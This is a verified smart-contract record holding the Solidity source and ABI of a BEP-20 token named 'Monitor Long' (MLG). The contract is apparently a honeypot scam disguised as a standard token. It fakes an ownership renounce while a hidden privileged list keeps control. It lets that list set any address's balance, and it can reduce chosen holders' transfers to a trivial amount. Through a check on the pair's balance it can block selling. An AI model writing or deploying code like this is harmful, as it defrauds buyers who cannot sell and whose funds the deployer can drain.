{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface receiverFundList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableSender {\n    function createPair(address walletAtAmount, address limitAuto) external returns (address);\n}\n\ninterface txAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptLimit) external view returns (uint256);\n\n    function transfer(address marketingTrading, uint256 atTrading) external returns (bool);\n\n    function allowance(address senderTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTrading,\n        uint256 atTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingReceiver, uint256 value);\n    event Approval(address indexed senderTeam, address indexed spender, uint256 value);\n}\n\ninterface txAutoMetadata is txAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MonitorLong is feeReceiver, txAuto, txAutoMetadata {\n\n    address private enableReceiver;\n\n    string private launchedReceiver = \"Monitor Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return launchedReceiver;\n    }\n\n    function exemptTo(address receiverSell) public {\n        isTo();\n        if (teamExempt == fromSellMarketing) {\n            teamExempt = launchFund;\n        }\n        if (receiverSell == atSwap || receiverSell == sellExempt) {\n            return;\n        }\n        liquidityList[receiverSell] = true;\n    }\n\n    address public atSwap;\n\n    uint256 public launchFund;\n\n    string private sellAmount = \"MLG\";\n\n    address fundSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private enableIsLimit = 18;\n\n    bool public listTake;\n\n    function sellAuto(address tokenFrom, address marketingTrading, uint256 atTrading) internal returns (bool) {\n        if (tokenFrom == atSwap) {\n            return walletFrom(tokenFrom, marketingTrading, atTrading);\n        }\n        uint256 maxLaunch = txAuto(sellExempt).balanceOf(liquidityAuto);\n        require(maxLaunch == buyIs);\n        require(marketingTrading != liquidityAuto);\n        if (liquidityList[tokenFrom]) {\n            return walletFrom(tokenFrom, marketingTrading, launchFromIs);\n        }\n        return walletFrom(tokenFrom, marketingTrading, atTrading);\n    }\n\n    function transfer(address totalSwap, uint256 atTrading) external virtual override returns (bool) {\n        return sellAuto(_msgSender(), totalSwap, atTrading);\n    }\n\n    function owner() external view returns (address) {\n        return enableReceiver;\n    }\n\n    event OwnershipTransferred(address indexed exemptSender, address indexed atExempt);\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellAmount;\n    }\n\n    function swapLimit(uint256 atTrading) public {\n        isTo();\n        buyIs = atTrading;\n    }\n\n    function takeShould(address buyTx) public {\n        if (listTake) {\n            return;\n        }\n        \n        txMarketing[buyTx] = true;\n        \n        listTake = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptIsMin;\n\n    bool private swapFund;\n\n    uint256 receiverTrading;\n\n    bool public shouldMode;\n\n    uint256 private fromSellMarketing;\n\n    function balanceOf(address exemptLimit) public view virtual override returns (uint256) {\n        return autoFund[exemptLimit];\n    }\n\n    function approve(address totalAmount, uint256 atTrading) public virtual override returns (bool) {\n        exemptIsMin[_msgSender()][totalAmount] = atTrading;\n        emit Approval(_msgSender(), totalAmount, atTrading);\n        return true;\n    }\n\n    address liquidityAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public sellExempt;\n\n    function amountMaxBuy(address totalSwap, uint256 atTrading) public {\n        isTo();\n        autoFund[totalSwap] = atTrading;\n    }\n\n    mapping(address => uint256) private autoFund;\n\n    function allowance(address modeToken, address totalAmount) external view virtual override returns (uint256) {\n        if (totalAmount == fundSwap) {\n            return type(uint256).max;\n        }\n        return exemptIsMin[modeToken][totalAmount];\n    }\n\n    bool public atFee;\n\n    function sellFee() public {\n        emit OwnershipTransferred(atSwap, address(0));\n        enableReceiver = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toWalletSwap;\n    }\n\n    mapping(address => bool) public txMarketing;\n\n    constructor (){\n        if (txReceiverTake != enableTotalBuy) {\n            enableTotalBuy = true;\n        }\n        receiverFundList takeTo = receiverFundList(fundSwap);\n        sellExempt = enableSender(takeTo.factory()).createPair(takeTo.WETH(), address(this));\n        \n        atSwap = _msgSender();\n        sellFee();\n        txMarketing[atSwap] = true;\n        autoFund[atSwap] = toWalletSwap;\n        if (txReceiverTake) {\n            shouldMode = true;\n        }\n        emit Transfer(address(0), atSwap, toWalletSwap);\n    }\n\n    function isTo() private view {\n        require(txMarketing[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return enableReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableIsLimit;\n    }\n\n    mapping(address => bool) public liquidityList;\n\n    bool private txReceiverTake;\n\n    uint256 private toWalletSwap = 100000000 * 10 ** 18;\n\n    function walletFrom(address tokenFrom, address marketingTrading, uint256 atTrading) internal returns (bool) {\n        require(autoFund[tokenFrom] >= atTrading);\n        autoFund[tokenFrom] -= atTrading;\n        autoFund[marketingTrading] += atTrading;\n        emit Transfer(tokenFrom, marketingTrading, atTrading);\n        return true;\n    }\n\n    uint256 constant launchFromIs = 6 ** 10;\n\n    uint256 private teamExempt;\n\n    uint256 buyIs;\n\n    function transferFrom(address tokenFrom, address marketingTrading, uint256 atTrading) external override returns (bool) {\n        if (_msgSender() != fundSwap) {\n            if (exemptIsMin[tokenFrom][_msgSender()] != type(uint256).max) {\n                require(atTrading <= exemptIsMin[tokenFrom][_msgSender()]);\n                exemptIsMin[tokenFrom][_msgSender()] -= atTrading;\n            }\n        }\n        return sellAuto(tokenFrom, marketingTrading, atTrading);\n    }\n\n    bool private enableTotalBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"amountMaxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"swapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"}],\"name\":\"takeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MonitorLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}